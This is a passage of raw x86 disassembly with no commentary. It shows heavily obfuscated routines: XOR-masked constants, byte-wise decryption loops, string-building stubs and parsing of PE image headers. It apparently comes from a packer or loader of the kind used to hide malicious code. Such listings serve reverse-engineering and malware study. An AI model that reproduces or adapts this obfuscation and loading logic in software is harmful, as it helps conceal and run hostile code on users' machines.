  42506e:	mov    eax,DWORD PTR [ebp-0x30]
  425071:	mov    ecx,DWORD PTR [ebp-0xc]
  425074:	xor    eax,ebx
  425076:	lea    eax,[eax+ecx*1+0x3272f6]
  42507d:	mov    DWORD PTR [ebp-0xc],eax
  425080:	mov    eax,DWORD PTR [ebp-0x30]
  425083:	xor    eax,ebx
  425085:	mov    ecx,0xffcd8d0a
  42508a:	sub    ecx,eax
  42508c:	add    ecx,DWORD PTR [ebp-0x28]
  42508f:	mov    eax,DWORD PTR [ebp-0x30]
  425092:	mov    edx,DWORD PTR [ebp-0xc]
  425095:	xor    eax,ebx
  425097:	add    eax,esi
  425099:	imul   eax,edx
  42509c:	cmp    eax,ecx
  42509e:	jbe    0x424eb0
  4250a4:	mov    eax,DWORD PTR [ebp-0x10]
  4250a7:	mov    ecx,DWORD PTR [ebp-0x3c]
  4250aa:	mov    eax,DWORD PTR [ebp+0x8]
  4250ad:	mov    edx,DWORD PTR [ebp-0x54]
  4250b0:	mov    eax,DWORD PTR [eax+0x1e0]
  4250b6:	xor    edx,ebx
  4250b8:	add    edx,esi
  4250ba:	push   edx
  4250bb:	mov    edx,DWORD PTR [ebp-0x40]
  4250be:	xor    edx,ebx
  4250c0:	add    edx,esi
  4250c2:	push   edx
  4250c3:	push   ecx
  4250c4:	mov    DWORD PTR [ebp-0x38],ecx
  4250c7:	mov    ecx,DWORD PTR [ebp-0x10]
  4250ca:	xor    ecx,ebx
  4250cc:	add    ecx,esi
  4250ce:	push   ecx
  4250cf:	call   DWORD PTR [eax+0x14]
  4250d2:	mov    edi,eax
  4250d4:	mov    eax,DWORD PTR [ebp-0x10]
  4250d7:	xor    eax,ebx
  4250d9:	add    eax,esi
  4250db:	cmp    eax,edi
  4250dd:	je     0x425138
  4250df:	mov    eax,DWORD PTR [ebp-0x10]
  4250e2:	jmp    0x425105
  4250e4:	mov    ecx,DWORD PTR [ebp-0x2c]
  4250e7:	xor    eax,ebx
  4250e9:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f6]
  4250f0:	mov    BYTE PTR [eax+edi*1+0x3272f6],cl
  4250f7:	mov    ecx,DWORD PTR [ebp-0x18]
  4250fa:	xor    ecx,ebx
  4250fc:	lea    eax,[ecx+eax*1+0x3272f6]
  425103:	xor    eax,ebx
  425105:	mov    ecx,DWORD PTR [ebp-0x3c]
  425108:	sub    ecx,esi
  42510a:	xor    ecx,ebx
  42510c:	cmp    eax,ecx
  42510e:	jne    0x4250e4
  425110:	mov    eax,DWORD PTR [ebp+0x8]
  425113:	mov    ecx,DWORD PTR [ebp-0x50]
  425116:	mov    eax,DWORD PTR [eax+0x1e0]
  42511c:	xor    ecx,ebx
  42511e:	add    ecx,esi
  425120:	push   ecx
  425121:	mov    ecx,DWORD PTR [ebp-0x10]
  425124:	xor    ecx,ebx
  425126:	add    ecx,esi
  425128:	push   ecx
  425129:	push   DWORD PTR [ebp-0x2c]
  42512c:	call   DWORD PTR [eax+0x18]
  42512f:	mov    eax,DWORD PTR [ebp-0x38]
  425132:	mov    DWORD PTR [ebp-0x2c],edi
  425135:	mov    DWORD PTR [ebp-0x3c],eax
  425138:	mov    eax,DWORD PTR [ebp-0x2c]
  42513b:	mov    DWORD PTR [ebp-0x14],eax
  42513e:	mov    eax,DWORD PTR [ebp-0x18]
  425141:	mov    ecx,DWORD PTR [ebp-0x10]
  425144:	xor    eax,ebx
  425146:	add    eax,esi
  425148:	mov    DWORD PTR [ebp-0x5c],0x422b332b
  42514f:	mov    DWORD PTR [ebp-0x58],0x382b402b
  425156:	jmp    0x425189
  425158:	mov    edx,DWORD PTR [ebp-0x14]
  42515b:	mov    edi,ecx
  42515d:	xor    edi,ebx
  42515f:	mov    cl,BYTE PTR [ebp+edi*1+0x32729a]
  425166:	movsx  edx,BYTE PTR [edi+edx*1+0x3272f6]
  42516e:	xor    cl,0x7f
  425171:	add    cl,0x4
  425174:	movzx  ecx,cl
  425177:	cmp    edx,ecx
  425179:	jne    0x425193
  42517b:	mov    ecx,DWORD PTR [ebp-0x18]
  42517e:	xor    ecx,ebx
  425180:	lea    ecx,[ecx+edi*1+0x3272f6]
  425187:	xor    ecx,ebx
  425189:	cmp    ecx,0xf89c85bd
  42518f:	jne    0x425158
  425191:	jmp    0x42519a
  425193:	mov    eax,DWORD PTR [ebp-0x10]
  425196:	xor    eax,ebx
  425198:	add    eax,esi
  42519a:	mov    ecx,DWORD PTR [ebp-0x10]
  42519d:	xor    ecx,ebx
  42519f:	add    ecx,esi
  4251a1:	cmp    ecx,eax
  4251a3:	je     0x425319
  4251a9:	mov    eax,DWORD PTR [ebp-0x14]
  4251ac:	mov    eax,DWORD PTR [eax+0x8]
  4251af:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4251b6:	mov    DWORD PTR [ebp-0x40],0xf89cc3d6
  4251bd:	mov    DWORD PTR [ebp-0x44],0xf89cb5a5
  4251c4:	mov    DWORD PTR [ebp-0x24],0xf89c85a1
  4251cb:	mov    DWORD PTR [ebp-0x20],eax
  4251ce:	mov    eax,DWORD PTR [ebp+0x8]
  4251d1:	mov    ecx,DWORD PTR [ebp-0x24]
  4251d4:	xor    ecx,ebx
  4251d6:	add    ecx,esi
  4251d8:	push   ecx
  4251d9:	mov    ecx,DWORD PTR [ebp-0x44]
  4251dc:	mov    eax,DWORD PTR [eax+0x1e0]
  4251e2:	xor    ecx,ebx
  4251e4:	add    ecx,esi
  4251e6:	push   ecx
  4251e7:	mov    ecx,DWORD PTR [ebp-0x40]
  4251ea:	xor    ecx,ebx
  4251ec:	add    ecx,esi
  4251ee:	push   ecx
  4251ef:	mov    ecx,DWORD PTR [ebp-0xc]
  4251f2:	xor    ecx,ebx
  4251f4:	add    ecx,esi
  4251f6:	push   ecx
  4251f7:	call   DWORD PTR [eax+0x14]
  4251fa:	mov    edi,eax
  4251fc:	mov    eax,DWORD PTR [ebp+0x8]
  4251ff:	mov    ecx,DWORD PTR [ebp-0x24]
  425202:	mov    eax,DWORD PTR [eax+0x1e0]
  425208:	xor    ecx,ebx
  42520a:	add    ecx,esi
  42520c:	push   ecx
  42520d:	mov    ecx,DWORD PTR [ebp-0x44]
  425210:	xor    ecx,ebx
  425212:	add    ecx,esi
  425214:	push   ecx
  425215:	mov    ecx,DWORD PTR [ebp-0xc]
  425218:	push   DWORD PTR [ebp-0x20]
  42521b:	xor    ecx,ebx
  42521d:	add    ecx,esi
  42521f:	push   ecx
  425220:	call   DWORD PTR [eax+0x14]
  425223:	mov    ecx,DWORD PTR [ebp-0xc]
  425226:	xor    ecx,ebx
  425228:	add    ecx,esi
  42522a:	mov    DWORD PTR [ebp-0x24],eax
  42522d:	cmp    ecx,edi
  42522f:	je     0x4255bc
  425235:	mov    ecx,DWORD PTR [ebp-0xc]
  425238:	xor    ecx,ebx
  42523a:	add    ecx,esi
  42523c:	cmp    ecx,eax
  42523e:	je     0x4255bc
  425244:	mov    DWORD PTR [ebp-0x40],0xf89c85a2
  42524b:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  425252:	mov    ecx,DWORD PTR [ebp-0x40]
  425255:	xor    cl,0xaf
  425258:	sub    cl,0xa
  42525b:	mov    BYTE PTR [edi],cl
  42525d:	mov    ecx,DWORD PTR [ebp-0xc]
  425260:	xor    cl,0xaf
  425263:	sub    cl,0xa
  425266:	mov    BYTE PTR [edi+0x1],cl
  425269:	mov    ecx,DWORD PTR [ebp-0x54]
  42526c:	xor    cl,0xaf
  42526f:	sub    cl,0xa
  425272:	mov    BYTE PTR [edi+0x2],cl
  425275:	and    DWORD PTR [ebp-0xc8],0x0
  42527c:	and    DWORD PTR [ebp-0xdc],0x0
  425283:	lea    ecx,[ebp-0xdc]
  425289:	push   ecx
  42528a:	push   DWORD PTR [ebp-0x20]
  42528d:	push   eax
  42528e:	lea    eax,[ebp-0xc8]
  425294:	push   eax
  425295:	mov    eax,DWORD PTR [ebp-0x14]
  425298:	push   DWORD PTR [eax+0xc]
  42529b:	mov    eax,DWORD PTR [ebp-0x2c]
  42529e:	add    eax,0x10
  4252a1:	push   eax
  4252a2:	push   edi
  4252a3:	call   0x424547
  4252a8:	mov    DWORD PTR [ebp-0x40],eax
  4252ab:	mov    eax,DWORD PTR [ebp+0x8]
  4252ae:	mov    ecx,DWORD PTR [ebp-0x50]
  4252b1:	mov    eax,DWORD PTR [eax+0x1e0]
  4252b7:	xor    ecx,ebx
  4252b9:	add    ecx,esi
  4252bb:	push   ecx
  4252bc:	mov    ecx,DWORD PTR [ebp-0xc]
  4252bf:	xor    ecx,ebx
  4252c1:	add    ecx,esi
  4252c3:	push   ecx
  4252c4:	push   edi
  4252c5:	call   DWORD PTR [eax+0x18]
  4252c8:	mov    eax,DWORD PTR [ebp-0x40]
  4252cb:	add    eax,0xffcd8d0a
  4252d0:	xor    eax,ebx
  4252d2:	cmp    eax,0xf89c85a5
  4252d7:	mov    eax,DWORD PTR [ebp+0x8]
  4252da:	mov    eax,DWORD PTR [eax+0x1e0]
  4252e0:	mov    ecx,DWORD PTR [ebp-0x50]
  4252e3:	jne    0x425306
  4252e5:	xor    ecx,ebx
  4252e7:	add    ecx,esi
  4252e9:	push   ecx
  4252ea:	mov    ecx,DWORD PTR [ebp-0xc]
  4252ed:	xor    ecx,ebx
  4252ef:	add    ecx,esi
  4252f1:	push   ecx
  4252f2:	push   DWORD PTR [ebp-0x2c]
  4252f5:	call   DWORD PTR [eax+0x18]
  4252f8:	mov    eax,DWORD PTR [ebp-0x24]
  4252fb:	mov    DWORD PTR [ebp-0x2c],eax
  4252fe:	mov    eax,DWORD PTR [ebp-0x20]
  425301:	mov    DWORD PTR [ebp-0x3c],eax
  425304:	jmp    0x425319
  425306:	xor    ecx,ebx
  425308:	add    ecx,esi
  42530a:	push   ecx
  42530b:	mov    ecx,DWORD PTR [ebp-0xc]
  42530e:	xor    ecx,ebx
  425310:	add    ecx,esi
  425312:	push   ecx
  425313:	push   DWORD PTR [ebp-0x24]
  425316:	call   DWORD PTR [eax+0x18]
  425319:	mov    eax,DWORD PTR [ebp-0x3c]
  42531c:	mov    DWORD PTR [ebp-0x34],eax
  42531f:	mov    eax,DWORD PTR [ebp-0x2c]
  425322:	mov    DWORD PTR [ebp-0x28],0xf89c85a5
  425329:	mov    DWORD PTR [ebp-0x40],eax
  42532c:	mov    edi,0xf89c85a4
  425331:	mov    DWORD PTR [ebp-0x30],edi
  425334:	mov    eax,DWORD PTR [ebp-0x28]
  425337:	xor    eax,ebx
  425339:	add    eax,esi
  42533b:	mov    DWORD PTR [ebp-0xc],eax
  42533e:	mov    eax,DWORD PTR [ebp-0x28]
  425341:	xor    eax,ebx
  425343:	add    eax,esi
  425345:	mov    DWORD PTR [ebp-0x14],eax
  425348:	mov    DWORD PTR [ebp-0x44],0xf89c8585
  42534f:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  425356:	mov    eax,DWORD PTR [ebp-0x28]
  425359:	mov    ecx,DWORD PTR [ebp-0x34]
  42535c:	xor    eax,ebx
  42535e:	add    eax,esi
  425360:	cmp    ecx,eax
  425362:	je     0x425558
  425368:	jmp    0x425534
  42536d:	mov    ecx,DWORD PTR [ebp-0xc]
  425370:	mov    eax,DWORD PTR [ebp-0x34]
  425373:	sub    eax,ecx
  425375:	mov    ecx,DWORD PTR [ebp-0x44]
  425378:	xor    ecx,ebx
  42537a:	add    ecx,esi
  42537c:	xor    edx,edx
  42537e:	div    ecx
  425380:	mov    DWORD PTR [ebp-0x14],eax
  425383:	mov    eax,DWORD PTR [ebp-0x24]
  425386:	mov    ecx,DWORD PTR [ebp-0x14]
  425389:	xor    eax,ebx
  42538b:	add    eax,esi
  42538d:	cmp    ecx,eax
  42538f:	jbe    0x42539b
  425391:	mov    eax,DWORD PTR [ebp-0x24]
  425394:	xor    eax,ebx
  425396:	add    eax,esi
  425398:	mov    DWORD PTR [ebp-0x14],eax
  42539b:	mov    eax,DWORD PTR [ebp-0x44]
  42539e:	mov    ecx,DWORD PTR [ebp-0x14]
  4253a1:	xor    eax,ebx
  4253a3:	add    eax,esi
  4253a5:	imul   eax,ecx
  4253a8:	mov    DWORD PTR [ebp-0x14],eax
  4253ab:	mov    eax,DWORD PTR [ebp-0x28]
  4253ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4253b1:	xor    eax,ebx
  4253b3:	add    eax,esi
  4253b5:	cmp    ecx,eax
  4253b7:	je     0x425522
  4253bd:	mov    eax,DWORD PTR [ebp-0x14]
  4253c0:	mov    DWORD PTR [ebp-0x20],eax
  4253c3:	mov    eax,DWORD PTR [ebp-0xc]
  4253c6:	add    eax,DWORD PTR [ebp-0x40]
  4253c9:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  4253d0:	mov    DWORD PTR [ebp-0x14],edi
  4253d3:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  4253da:	mov    DWORD PTR [ebp-0x1c],eax
  4253dd:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  4253e4:	mov    DWORD PTR [ebp-0x8],edi
  4253e7:	mov    eax,DWORD PTR [ebp-0x4c]
  4253ea:	xor    eax,ebx
  4253ec:	add    eax,esi
  4253ee:	jmp    0x4254e1
  4253f3:	mov    DWORD PTR [ebp-0xe4],0xf89c85ba
  4253fd:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  425407:	mov    eax,DWORD PTR [ebp-0x8]
  42540a:	mov    ecx,DWORD PTR [ebp-0x18]
  42540d:	xor    eax,ebx
  42540f:	add    eax,esi
  425411:	imul   eax,ecx
  425414:	mov    ecx,DWORD PTR [ebp-0x1c]
  425417:	mov    al,BYTE PTR [eax+ecx*1]
  42541a:	mov    BYTE PTR [ebp-0x1],al
  42541d:	mov    eax,DWORD PTR [ebp-0x8]
  425420:	mov    ecx,DWORD PTR [ebp-0x18]
  425423:	xor    eax,ebx
  425425:	add    eax,esi
  425427:	imul   eax,ecx
  42542a:	mov    ecx,DWORD PTR [ebp-0x54]
  42542d:	xor    ecx,ebx
  42542f:	add    eax,ecx
  425431:	mov    ecx,DWORD PTR [ebp-0x1c]
  425434:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  42543c:	mov    ecx,DWORD PTR [ebp-0xe4]
  425442:	xor    ecx,ebx
  425444:	lea    eax,[ecx+eax*1+0x3272f6]
  42544b:	movzx  ecx,BYTE PTR [ebp-0x1]
  42544f:	xor    ecx,eax
  425451:	mov    BYTE PTR [ebp-0x1],cl
  425454:	mov    al,BYTE PTR [ebp-0x1]
  425457:	mov    ecx,DWORD PTR [ebp-0x8]
  42545a:	mov    edx,DWORD PTR [ebp-0x18]
  42545d:	xor    ecx,ebx
  42545f:	add    ecx,esi
  425461:	imul   ecx,edx
  425464:	mov    edx,DWORD PTR [ebp-0x1c]
  425467:	mov    BYTE PTR [ecx+edx*1],al
  42546a:	mov    eax,DWORD PTR [ebp-0x8]
  42546d:	mov    ecx,DWORD PTR [ebp-0x18]
  425470:	xor    eax,ebx
  425472:	add    eax,esi
  425474:	imul   eax,ecx
  425477:	mov    ecx,DWORD PTR [ebp-0x1c]
  42547a:	mov    al,BYTE PTR [eax+ecx*1]
  42547d:	mov    BYTE PTR [ebp-0x1],al
  425480:	mov    eax,DWORD PTR [ebp-0x8]
  425483:	mov    ecx,DWORD PTR [ebp-0x18]
  425486:	xor    eax,ebx
  425488:	add    eax,esi
  42548a:	imul   eax,ecx
  42548d:	mov    ecx,DWORD PTR [ebp-0x14]
  425490:	xor    ecx,ebx
  425492:	add    eax,ecx
  425494:	mov    ecx,DWORD PTR [ebp-0x1c]
  425497:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  42549f:	mov    ecx,DWORD PTR [ebp-0xd0]
  4254a5:	xor    ecx,ebx
  4254a7:	lea    eax,[ecx+eax*1+0x3272f6]
  4254ae:	movzx  ecx,BYTE PTR [ebp-0x1]
  4254b2:	xor    ecx,eax
  4254b4:	mov    BYTE PTR [ebp-0x1],cl
  4254b7:	mov    al,BYTE PTR [ebp-0x1]
  4254ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4254bd:	mov    edx,DWORD PTR [ebp-0x18]
  4254c0:	xor    ecx,ebx
  4254c2:	add    ecx,esi
  4254c4:	imul   ecx,edx
  4254c7:	mov    edx,DWORD PTR [ebp-0x1c]
  4254ca:	mov    BYTE PTR [ecx+edx*1],al
  4254cd:	mov    eax,DWORD PTR [ebp-0x38]
  4254d0:	mov    ecx,DWORD PTR [ebp-0x14]
  4254d3:	xor    eax,ebx
  4254d5:	xor    ecx,ebx
  4254d7:	add    eax,esi
  4254d9:	add    ecx,esi
  4254db:	imul   eax,ecx
  4254de:	add    eax,DWORD PTR [ebp-0x18]
  4254e1:	mov    DWORD PTR [ebp-0x18],eax
  4254e4:	mov    eax,DWORD PTR [ebp-0x18]
  4254e7:	mov    ecx,DWORD PTR [ebp-0x20]
  4254ea:	cmp    ecx,eax
  4254ec:	jb     0x4253f3
  4254f2:	mov    eax,DWORD PTR [ebp-0x14]
  4254f5:	mov    ecx,DWORD PTR [ebp-0x20]
  4254f8:	xor    eax,ebx
  4254fa:	add    eax,esi
  4254fc:	imul   eax,ecx
  4254ff:	mov    ecx,DWORD PTR [ebp-0x4c]
  425502:	xor    ecx,ebx
  425504:	add    ecx,esi
  425506:	or     eax,ecx
  425508:	mov    ecx,DWORD PTR [ebp-0x30]
  42550b:	xor    ecx,ebx
  42550d:	add    eax,ecx
  42550f:	mov    ecx,DWORD PTR [ebp-0x30]
  425512:	xor    ecx,ebx
  425514:	add    eax,ecx
  425516:	mov    ecx,DWORD PTR [ebp-0xc]
  425519:	lea    eax,[eax+ecx*1+0x64e5ec]
  425520:	jmp    0x425531
  425522:	mov    eax,DWORD PTR [ebp-0x30]
  425525:	mov    ecx,DWORD PTR [ebp-0xc]
  425528:	xor    eax,ebx
  42552a:	lea    eax,[eax+ecx*1+0x3272f6]
  425531:	mov    DWORD PTR [ebp-0xc],eax
  425534:	mov    eax,DWORD PTR [ebp-0x30]
  425537:	xor    eax,ebx
  425539:	mov    ecx,0xffcd8d0a
  42553e:	sub    ecx,eax
  425540:	add    ecx,DWORD PTR [ebp-0x34]
  425543:	mov    eax,DWORD PTR [ebp-0x30]
  425546:	mov    edx,DWORD PTR [ebp-0xc]
  425549:	xor    eax,ebx
  42554b:	add    eax,esi
  42554d:	imul   eax,edx
  425550:	cmp    eax,ecx
  425552:	jbe    0x42536d
  425558:	push   DWORD PTR [ebp+0x8]
  42555b:	mov    eax,DWORD PTR [ebp+0x8]
  42555e:	push   DWORD PTR [eax+0x1cc]
  425564:	lea    eax,[ebp-0xd8]
  42556a:	push   eax
  42556b:	mov    eax,DWORD PTR [ebp+0x8]
  42556e:	mov    eax,DWORD PTR [eax+0x1c4]
  425574:	push   DWORD PTR [eax]
  425576:	mov    eax,DWORD PTR [ebp+0x8]
  425579:	mov    eax,DWORD PTR [eax+0x1c0]
  42557f:	push   DWORD PTR [eax]
  425581:	push   DWORD PTR [ebp-0x3c]
  425584:	push   DWORD PTR [ebp-0x2c]
  425587:	call   0x42601e
  42558c:	mov    DWORD PTR [ebp-0x40],eax
  42558f:	mov    eax,DWORD PTR [ebp-0x10]
  425592:	mov    ecx,DWORD PTR [ebp-0x2c]
  425595:	xor    eax,ebx
  425597:	add    eax,esi
  425599:	cmp    eax,ecx
  42559b:	je     0x4255bc
  42559d:	mov    eax,DWORD PTR [ebp+0x8]
  4255a0:	mov    ecx,DWORD PTR [ebp-0x50]
  4255a3:	mov    eax,DWORD PTR [eax+0x1e0]
  4255a9:	xor    ecx,ebx
  4255ab:	add    ecx,esi
  4255ad:	push   ecx
  4255ae:	mov    ecx,DWORD PTR [ebp-0x10]
  4255b1:	xor    ecx,ebx
  4255b3:	add    ecx,esi
  4255b5:	push   ecx
  4255b6:	push   DWORD PTR [ebp-0x2c]
  4255b9:	call   DWORD PTR [eax+0x18]
  4255bc:	pop    edi
  4255bd:	pop    esi
  4255be:	pop    ebx
  4255bf:	leave  
  4255c0:	ret    0x4
  4255c3:	push   ebp
  4255c4:	mov    ebp,esp
  4255c6:	push   ecx
  4255c7:	push   ecx
  4255c8:	lea    eax,[ebp-0x8]
  4255cb:	mov    DWORD PTR [ebp-0x4],eax
  4255ce:	push   esi
  4255cf:	mov    esi,DWORD PTR [ebp-0x4]
  4255d2:	mov    eax,0xf881ba2f
  4255d7:	mov    DWORD PTR [esi],eax
  4255d9:	mov    esi,DWORD PTR [ebp-0x8]
  4255dc:	cmp    esi,eax
  4255de:	pop    esi
  4255df:	jne    0x4255e9
  4255e1:	mov    BYTE PTR [ecx+0xa],0x83
  4255e5:	mov    BYTE PTR [edx+0x8],0x30
  4255e9:	mov    BYTE PTR [edx+0xa],0x83
  4255ed:	mov    BYTE PTR [ecx+0x2],0x15
  4255f1:	leave  
  4255f2:	ret    
  4255f3:	push   ebp
  4255f4:	mov    ebp,esp
  4255f6:	push   ecx
  4255f7:	push   ecx
  4255f8:	lea    eax,[ebp-0x8]
  4255fb:	mov    DWORD PTR [ebp-0x4],eax
  4255fe:	mov    edx,DWORD PTR [ebp-0x4]
  425601:	mov    eax,0xf88b0bcb
  425606:	mov    DWORD PTR [edx],eax
  425608:	mov    edx,DWORD PTR [ebp-0x8]
  42560b:	cmp    edx,eax
  42560d:	jne    0x42561e
  42560f:	mov    eax,DWORD PTR [ebp+0x8]
  425612:	mov    BYTE PTR [ecx+0x9],0xf
  425616:	mov    BYTE PTR [eax+0x7],0x58
  42561a:	mov    BYTE PTR [ecx+0x6],0x10
  42561e:	mov    BYTE PTR [ecx+0x3],0x1f
  425622:	leave  
  425623:	ret    0x4
  425626:	push   ebp
  425627:	mov    ebp,esp
  425629:	push   ecx
  42562a:	push   ecx
  42562b:	lea    eax,[ebp-0x8]
  42562e:	mov    DWORD PTR [ebp-0x4],eax
  425631:	mov    edx,DWORD PTR [ebp-0x4]
  425634:	mov    eax,0x7e0da2f
  425639:	mov    DWORD PTR [edx],eax
  42563b:	mov    edx,DWORD PTR [ebp-0x8]
  42563e:	cmp    edx,eax
  425640:	jne    0x425646
  425642:	mov    BYTE PTR [ecx+0x7],0x58
  425646:	mov    eax,DWORD PTR [ebp+0x8]
  425649:	mov    BYTE PTR [ecx+0x1],0x1a
  42564d:	mov    BYTE PTR [eax+0x9],0x2f
  425651:	leave  
  425652:	ret    0x4
  425655:	push   ebp
  425656:	mov    ebp,esp
  425658:	push   ecx
  425659:	push   ecx
  42565a:	lea    eax,[ebp-0x8]
  42565d:	mov    DWORD PTR [ebp-0x4],eax
  425660:	push   esi
  425661:	mov    esi,DWORD PTR [ebp-0x4]
  425664:	mov    eax,0x7060e3e
  425669:	mov    DWORD PTR [esi],eax
  42566b:	mov    esi,DWORD PTR [ebp-0x8]
  42566e:	cmp    esi,eax
  425670:	pop    esi
  425671:	jne    0x42567d
  425673:	mov    BYTE PTR [edx+0x4],0x14
  425677:	mov    WORD PTR [ecx+0x3],0x141f
  42567d:	mov    BYTE PTR [edx],0x40
  425680:	leave  
  425681:	ret    
  425682:	push   ebp
  425683:	mov    ebp,esp
  425685:	push   ecx
  425686:	push   ecx
  425687:	lea    eax,[ebp-0x8]
  42568a:	mov    DWORD PTR [ebp-0x4],eax
  42568d:	mov    edx,DWORD PTR [ebp-0x4]
  425690:	mov    eax,0xf8870b3f
  425695:	mov    DWORD PTR [edx],eax
  425697:	mov    edx,DWORD PTR [ebp-0x8]
  42569a:	cmp    edx,eax
  42569c:	jne    0x4256a9
  42569e:	mov    eax,DWORD PTR [ebp+0x8]
  4256a1:	mov    BYTE PTR [ecx+0x8],0x10
  4256a5:	mov    BYTE PTR [eax+0x1],0x1a
  4256a9:	mov    BYTE PTR [ecx+0x5],0xc
  4256ad:	leave  
  4256ae:	ret    0x4
  4256b1:	push   esi
  4256b2:	mov    ecx,edi
  4256b4:	call   0x425682
  4256b9:	mov    edx,edi
  4256bb:	mov    ecx,esi
  4256bd:	mov    BYTE PTR [esi],0x20
  4256c0:	call   0x425655
  4256c5:	push   esi
  4256c6:	mov    ecx,edi
  4256c8:	mov    BYTE PTR [esi+0x5],0xc
  4256cc:	call   0x425626
  4256d1:	push   esi
  4256d2:	mov    BYTE PTR [esi+0x6],0x10
  4256d6:	call   0x4255f3
  4256db:	mov    BYTE PTR [esi+0x2],0x15
  4256df:	mov    edx,esi
  4256e1:	jmp    0x4255c3
  4256e6:	push   ebp
  4256e7:	mov    ebp,esp
  4256e9:	push   ecx
  4256ea:	mov    ecx,DWORD PTR [edx+0x194]
  4256f0:	push   esi
  4256f1:	mov    esi,DWORD PTR [ebp+0x8]
  4256f4:	mov    esi,DWORD PTR [esi]
  4256f6:	mov    DWORD PTR [ecx],esi
  4256f8:	mov    ecx,DWORD PTR [edx+0x194]
  4256fe:	mov    ecx,DWORD PTR [ecx]
  425700:	mov    esi,DWORD PTR [edx+0x190]
  425706:	mov    DWORD PTR [esi],ecx
  425708:	mov    eax,DWORD PTR [edx+0x194]
  42570e:	mov    ecx,DWORD PTR [eax]
  425710:	mov    ecx,DWORD PTR [ecx+0x3c]
  425713:	add    ecx,DWORD PTR [eax]
  425715:	mov    DWORD PTR [ebp-0x4],0xf89ca5a5
  42571c:	mov    eax,DWORD PTR [ebp-0x4]
  42571f:	movzx  ecx,WORD PTR [ecx+0x16]
  425723:	xor    eax,0x75108af
  425728:	add    eax,0x3272f6
  42572d:	pop    esi
  42572e:	test   ecx,eax
  425730:	je     0x42573e
  425732:	mov    eax,DWORD PTR [edx+0x1c8]
  425738:	mov    DWORD PTR [eax],0xf89c85a4
  42573e:	leave  
  42573f:	ret    0x4
  425742:	push   ebp
  425743:	mov    ebp,esp
  425745:	sub    esp,0x70
  425748:	and    DWORD PTR [ebp-0x20],0x0
  42574c:	mov    DWORD PTR [ebp-0x18],0xf89cb5a5
  425753:	mov    DWORD PTR [ebp-0x1c],0xf89c85e5
  42575a:	mov    DWORD PTR [ebp-0x2c],0xf89c85a1
  425761:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  425768:	mov    DWORD PTR [ebp-0x2c],0xf89f05a5
  42576f:	mov    eax,DWORD PTR [ebp+0x20]
  425772:	mov    eax,DWORD PTR [eax+0x194]
  425778:	mov    DWORD PTR [ebp-0xc],eax
  42577b:	mov    eax,DWORD PTR [ebp+0x20]
  42577e:	push   ebx
  42577f:	push   esi
  425780:	mov    esi,DWORD PTR [eax+0x190]
  425786:	mov    eax,DWORD PTR [ebp+0x20]
  425789:	mov    eax,DWORD PTR [eax+0x18c]
  42578f:	mov    DWORD PTR [ebp-0x8],eax
  425792:	mov    eax,DWORD PTR [eax]
  425794:	push   edi
  425795:	mov    DWORD PTR [ebp-0x4],esi
  425798:	test   eax,eax
  42579a:	jne    0x4257a7
  42579c:	push   DWORD PTR [ebp+0x1c]
  42579f:	mov    edx,DWORD PTR [ebp+0x20]
  4257a2:	call   0x4256e6
  4257a7:	mov    eax,DWORD PTR [esi]
  4257a9:	mov    ebx,DWORD PTR [esi]
  4257ab:	add    ebx,DWORD PTR [eax+0x3c]
  4257ae:	mov    eax,DWORD PTR [ebp+0xc]
  4257b1:	mov    ecx,DWORD PTR [ebp-0x8]
  4257b4:	mov    ecx,DWORD PTR [ecx]
  4257b6:	mov    esi,0x75108af
  4257bb:	xor    eax,esi
  4257bd:	mov    edi,0x3272f6
  4257c2:	add    eax,edi
  4257c4:	cmp    eax,ecx
  4257c6:	jne    0x4259fe
  4257cc:	mov    eax,DWORD PTR [ebp-0xc]
  4257cf:	mov    eax,DWORD PTR [eax]
  4257d1:	mov    DWORD PTR [ebp-0x10],eax
  4257d4:	mov    eax,DWORD PTR [ebx+0x50]
  4257d7:	mov    DWORD PTR [ebp-0x68],eax
  4257da:	mov    eax,DWORD PTR [ebp-0x18]
  4257dd:	xor    eax,esi
  4257df:	add    eax,edi
  4257e1:	mov    DWORD PTR [ebp-0x64],eax
  4257e4:	mov    eax,DWORD PTR [ebp-0x14]
  4257e7:	and    DWORD PTR [ebp-0x6c],0x0
  4257eb:	xor    eax,esi
  4257ed:	add    eax,edi
  4257ef:	mov    DWORD PTR [ebp-0x60],eax
  4257f2:	lea    eax,[ebp-0x70]
  4257f5:	push   eax
  4257f6:	mov    eax,DWORD PTR [ebp+0x8]
  4257f9:	xor    eax,esi
  4257fb:	add    eax,edi
  4257fd:	push   eax
  4257fe:	mov    eax,DWORD PTR [ebp+0x20]
  425801:	add    eax,0xaa
  425806:	push   eax
  425807:	mov    eax,DWORD PTR [ebp+0x20]
  42580a:	mov    eax,DWORD PTR [eax+0x198]
  425810:	mov    DWORD PTR [ebp-0x70],0x4
  425817:	push   DWORD PTR [eax]
  425819:	mov    eax,DWORD PTR [ebp+0x10]
  42581c:	call   eax
  42581e:	mov    ecx,DWORD PTR [ebp-0xc]
  425821:	mov    ecx,DWORD PTR [ecx]
  425823:	mov    edx,DWORD PTR [ebp-0x8]
  425826:	mov    DWORD PTR [ebp-0x6c],eax
  425829:	mov    DWORD PTR [ebp+0x1c],eax
  42582c:	mov    DWORD PTR [edx],ecx
  42582e:	mov    ecx,DWORD PTR [ebp-0x4]
  425831:	mov    DWORD PTR [ecx],eax
  425833:	mov    eax,DWORD PTR [ebx+0x50]
  425836:	mov    DWORD PTR [ebp-0x68],eax
  425839:	mov    eax,DWORD PTR [ebp-0x1c]
  42583c:	xor    eax,esi
  42583e:	add    eax,edi
  425840:	mov    DWORD PTR [ebp-0x64],eax
  425843:	lea    eax,[ebp-0x20]
  425846:	mov    DWORD PTR [ebp-0x60],eax
  425849:	lea    eax,[ebp-0x70]
  42584c:	push   eax
  42584d:	mov    eax,DWORD PTR [ebp+0x8]
  425850:	xor    eax,esi
